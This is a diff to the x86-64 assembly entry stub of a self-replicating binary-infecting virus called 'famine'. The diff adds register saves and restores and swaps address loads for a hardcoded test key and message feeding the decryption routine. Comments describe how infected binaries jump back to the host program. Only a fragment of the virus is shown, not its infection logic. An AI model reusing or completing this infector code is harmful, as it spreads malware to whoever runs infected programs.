@@ -32,19 +32,29 @@ _start:
 	push	rcx
 	push	rdx
 	push	rsp
+    push    rsi
+    push    rdi
+    push    r15
+    push    r14
+    push    r13
+    push    r12
+    push    r11
+    push    r10
+    push    r9
+    push    r8
 
 	;si je suis l'original
-	jmp end_decrypt
+	; jmp end_decrypt
 
     xor r15, r15
     sub rsp, 8                    ; Réserver 8 octets sur la pile pour `block`
 	; debut = lea r8, [rel famine]
-	lea r8, [rel famine]
+	; lea r8, [rel famine]
 	;va load l'addresse du debut de la fonction famine (virus)
     mov r8, 0xF232B1C13CEDE077  ; r8 contient le message complet (64 bits)
     bswap r8
 	; fin = lea r9, [rel _start]
-	lea r9, [rel _start]
+	; lea r9, [rel _start]
 	; va load l'addresse du debut de start (fin du virus, start non compris)
     mov r9, 8                   ; r9 contient la longueur du message (8 octets)
     mov r10, 0x123456789ABCDEF0 ; r10 contient la clé (64 bits)
@@ -123,11 +133,23 @@ end_decrypt:
 	call	famine	
 
 	add rsp, 8
+
+    pop     r8
+    pop     r9
+    pop     r10
+    pop     r11
+    pop     r12
+    pop     r13
+    pop     r14
+    pop     r15
+    pop     rdi
+    pop     rsi
 	pop		rsp
 	pop		rdx
 	pop		rcx
 	pop		rbx
 	pop		rax
+
 	jmp	0x4		; Does nothing but is the "lunch-pad" to the real entrypoint.
 				; The "0x4" value will be changed on infected binaries to 
 				; jump back to the program execution	
